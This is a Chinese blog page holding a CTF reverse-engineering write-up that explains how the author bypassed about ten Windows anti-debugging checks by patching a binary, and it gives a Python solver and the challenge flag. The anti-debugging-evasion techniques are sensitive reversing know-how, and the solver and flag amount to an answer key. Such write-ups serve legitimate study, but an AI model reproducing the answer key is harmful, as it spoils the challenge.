<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/L-hq815/archive/2012/07/09/2583043.html%EF%BC%88linux%E4%B8%8B%EF%BC%89">https://www.cnblogs.com/L-hq815/archive/2012/07/09/2583043.html（linux下）</a></p>
<p>推介结合winapi看</p>
<p>(后续找个时间试试多线程)</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://2298233831.github.io/2022/04/15/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95(bushi)%E7%9A%84%E5%8F%8D%E8%B0%83%E8%AF%95%E9%A2%98%E7%9B%AE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Yu4n">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="The Blog of Yu4n">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/15/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95(bushi)%E7%9A%84%E5%8F%8D%E8%B0%83%E8%AF%95%E9%A2%98%E7%9B%AE/" class="post-title-link" itemprop="url">一道简单(bushi)的反调试题目</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-04-15 13:32:16" itemprop="dateCreated datePublished" datetime="2022-04-15T13:32:16+08:00">2022-04-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-10-14 23:23:22" itemprop="dateModified" datetime="2025-10-14T23:23:22+08:00">2025-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reverse/" itemprop="url" rel="index"><span itemprop="name">Reverse</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><img src="/2022/04/15/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95(bushi)%E7%9A%84%E5%8F%8D%E8%B0%83%E8%AF%95%E9%A2%98%E7%9B%AE/image-20220415133333747.png" alt="image-20220415133333747"></p>
<p>拖进IDA打开，发现让程序运行起来就是一个问题。</p>
<p><img src="/2022/04/15/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95(bushi)%E7%9A%84%E5%8F%8D%E8%B0%83%E8%AF%95%E9%A2%98%E7%9B%AE/image-20220415133421969.png" alt="image-20220415133421969"></p>
<p>查看汇编代码，发现0x4010DE处的代码有问题，需要nop掉才能顺利反汇编</p>
<p>但是直接用IDA的Patch program-Assemble不行，尝试用OD打开进行nop，但是发现OD现实的地址跟IDA不一样，这是由于IDA加载的是静态的文件，而OD加载的动态的内存里的（其实这也是为什么打开修改文件属性的软件时，IDA能够同时打开该文件，而OD不能打开的原因），由于可能受到ASLR的影响，使得地址不一样。所以我们需要将其关闭，在OPTION_HEADER里找到DLLCharacteristics，将原本的8140改为8100或者0000即可。</p>
<p>（关于ASLR:<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E4%BD%8D%E5%9D%80%E7%A9%BA%E9%96%93%E9%85%8D%E7%BD%AE%E9%9A%A8%E6%A9%9F%E8%BC%89%E5%85%A5">ASLR</a>）</p>
<p><img src="/2022/04/15/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95(bushi)%E7%9A%84%E5%8F%8D%E8%B0%83%E8%AF%95%E9%A2%98%E7%9B%AE/image-20220415163903500.png" alt="image-20220415163903500"></p>
<p>需要注意的是，从0x4010D7开始，就是执行跳转的0x4010DE的代码，故，需要将0x4010D7到0x4010DE的都给nop掉，然后保存，再用IDA打开即可</p>
<p>如下是伪代码：</p>
<p><img src="/2022/04/15/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95(bushi)%E7%9A%84%E5%8F%8D%E8%B0%83%E8%AF%95%E9%A2%98%E7%9B%AE/image-20220415164426611.png" alt="image-20220415164426611"></p>
<p>那个if通过调试来看其实就是计算字符串长度并且检测字符串中是否含有不可见字符，只要没有不可见字符，这块都不会跳到wrong那儿</p>
<p><img src="/2022/04/15/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95(bushi)%E7%9A%84%E5%8F%8D%E8%B0%83%E8%AF%95%E9%A2%98%E7%9B%AE/image-20220415170345535.png" alt="image-20220415170345535"></p>
<p><img src="/2022/04/15/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95(bushi)%E7%9A%84%E5%8F%8D%E8%B0%83%E8%AF%95%E9%A2%98%E7%9B%AE/image-20220415170354222.png" alt="image-20220415170354222"></p>
<p><img src="/2022/04/15/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95(bushi)%E7%9A%84%E5%8F%8D%E8%B0%83%E8%AF%95%E9%A2%98%E7%9B%AE/image-20220415170403903.png" alt="image-20220415170403903"></p>
<p>再往下进入sub_4013F0函数</p>
<p><img src="/2022/04/15/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95(bushi)%E7%9A%84%E5%8F%8D%E8%B0%83%E8%AF%95%E9%A2%98%E7%9B%AE/image-20220415170858424.png" alt="image-20220415170858424"></p>
<p><img src="/2022/04/15/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95(bushi)%E7%9A%84%E5%8F%8D%E8%B0%83%E8%AF%95%E9%A2%98%E7%9B%AE/image-20220415173316263.png" alt="image-20220415173316263"></p>
<p>看着一片粉红的，几乎都是老面孔啊，逆向工程核心原理的反调试部分，复习一下。</p>
<p>首先，IsDebuggerPresent是一个检测是否处于调试状态，调试状态其值为1；CheckRemoteDebuggerPresent，这个和前者类似，甚至可以说一模一样，pbDebuggerPresent的值是TURE（调试状态）还是FALSE；</p>
<p>然后是SetLastError,OutputDebugString和GetLastError的组合拳了,OutputDebugString可以检查测进程是否处于调试状态，并且在调试状态下输出字符串，前者会设置一个错误码，如果OutputDebugString顺利执行，那么错误码不会改变，GetLastError就会获取错误码从而触发异常，如果OutputDebugString没有顺利执行，那错误码会被重置，使后者无法触发异常；</p>
<p>然后是NtQueryInformationProcess，核心原理那本书有详细的解释，简要说明其中一处就是其第二个成员ProcessDebugPort(0x7)，如果<strong>不在</strong>调试状态，其值为0；</p>
<p>下一组，SetLastError（上文设置错误码的函数），CloseHandle、GetLastError，跟上面介绍的同样，类似的还有利用CloseWindow，都是产生异常，使错误码改变</p>
<p>DebugActiveProcess,将活动进程附加到调试器，如果成功则返回1（非零数），否则为0，换言之，当前进程处在非调试状态返回0；</p>
<p>GetStartupInfoA，该函数用来检索创建调用进程时指定的STARTUPINFO结构体的内容。其参数为指向STARTUPINFO结构体的指针。STARTUPINFO结构体用来保存程序启动的信息，通过其中结构体参数的改变来检测程序是正常运行还是在调试器中运行的。一般双击运行的进程的父进程都是explorer.exe，但是如果进程被调试父进程则是调试器进程。也就是说如果父进程不是explorer.exe则可以认为程序正在被调试。以上即为其反调试原理，若STARTUPINFO结构体成员中有一项不为0，则检测到反调试。</p>
<p>下面两篇文章都是很好的学习材料。</p>
<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-252647.htm">反调试</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_32400847/article/details/52798050">反调试</a></p>
<p>再往下走</p>
<p><img src="/2022/04/15/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95(bushi)%E7%9A%84%E5%8F%8D%E8%B0%83%E8%AF%95%E9%A2%98%E7%9B%AE/image-20220415174816956.png" alt="image-20220415174816956"></p>
<p>这个函数是查找进程信息，并将其与几个常用的调试工具作比较，可以看到没有IDA，那这个函数就可以放心过，但还是进去看看，毕竟里面还有两个赋值操作，事关flag。</p>
<p>最后一个，RDTSC，这个就是时间检测法来实现反调试了</p>
<p>旧图新用</p>
<p><img src="/2022/04/15/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95(bushi)%E7%9A%84%E5%8F%8D%E8%B0%83%E8%AF%95%E9%A2%98%E7%9B%AE/image-20220415175143219.png" alt="image-20220415175143219"></p>
<p>综上，总共十处反调试，属于是在”堆怪”了。</p>
<p>回到main函数中，进入sub_4012A0函数</p>
<p><img src="/2022/04/15/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95(bushi)%E7%9A%84%E5%8F%8D%E8%B0%83%E8%AF%95%E9%A2%98%E7%9B%AE/image-20220415175727744.png" alt="image-20220415175727744"></p>
<p>就是一个普通的base64，没什么好说的。</p>
<p>再回到主函数的最后</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(&amp;v18 + v8) != v9[<span class="number">2</span> * v8 + <span class="number">1</span>] || v9[<span class="number">2</span> * v8] + <span class="number">2</span> != (off_404018[v8] ^ <span class="number">3</span>) )</span><br></pre></td></tr></table></figure>

<p>显而易见，将变化后的输入的字符串的奇数位和偶数位分别加工。</p>
<p>至此，整体流程分析完毕。</p>
<p>在过反调试的时候，我们注意al寄存器的值，其中会有不同的字符赋值给它，正确过掉反调试后所赋的值才是我们需要的数据。中间比较麻烦的可能就是错误码的两处。耐心点多试试，就能过掉了，尤其注意跳转指令的条件（可以结合伪代码来看，更容易理解）。我也调了好几次才全部过掉:(原罪的菜</p>
<p>在这之后，al所被赋值的字符串为2TVBnx0lnn</p>
<p>那这题难点也就结束了，直接贴上解题脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">str1 = <span class="string">&quot;LKd8gPYWS[&quot;</span></span><br><span class="line">str2 = <span class="string">&quot;2TVBnx0lnn&quot;</span></span><br><span class="line">arr = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    arr[i*<span class="number">2</span>] = (<span class="built_in">ord</span>(str1[i])^<span class="number">3</span>)-<span class="number">2</span><span class="string">&#x27;&#x27;&#x27;偶数位变化&#x27;&#x27;&#x27;</span></span><br><span class="line">    arr[i*<span class="number">2</span>+<span class="number">1</span>] = <span class="built_in">ord</span>(str2[i])<span class="string">&#x27;&#x27;&#x27;奇数位变化&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">cipher = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>,arr))</span><br><span class="line"><span class="built_in">print</span> cipher.decode(<span class="string">&#x27;base64&#x27;</span>) <span class="string">&#x27;&#x27;&#x27;python2版本的脚本&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>python3用这个吧</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">str1 = <span class="string">&quot;LKd8gPYWS[&quot;</span></span><br><span class="line">str2 = <span class="string">&quot;2TVBnx0lnn&quot;</span></span><br><span class="line">arr = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    arr[i*<span class="number">2</span>] = (<span class="built_in">ord</span>(str1[i])^<span class="number">3</span>)-<span class="number">2</span> </span><br><span class="line">    arr[i*<span class="number">2</span>+<span class="number">1</span>] = <span class="built_in">ord</span>(str2[i]) </span><br><span class="line"></span><br><span class="line">cipher = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>,arr))</span><br><span class="line">cipher = base64.b64decode(cipher)</span><br><span class="line"><span class="built_in">print</span>(cipher)</span><br></pre></td></tr></table></figure>

<p>flag:D0g3{3aSy_Ant1_De6ug}</p>
<p><a target="_blank" rel="noopener" href="https://github.com/2298233831/DailyLearn/blob/main/%E5%8E%9F%E9%A2%98.exe">附件</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/posts/page/2/">2</a><a class="page-number" href="/posts/page/3/">3</a><a class="extend next" rel="next" href="/posts/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Yu4n</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives">
          <span class="site-state-item-count">23</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">categories</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Yu4n</span>
</div>
<!--
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>
-->


 

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
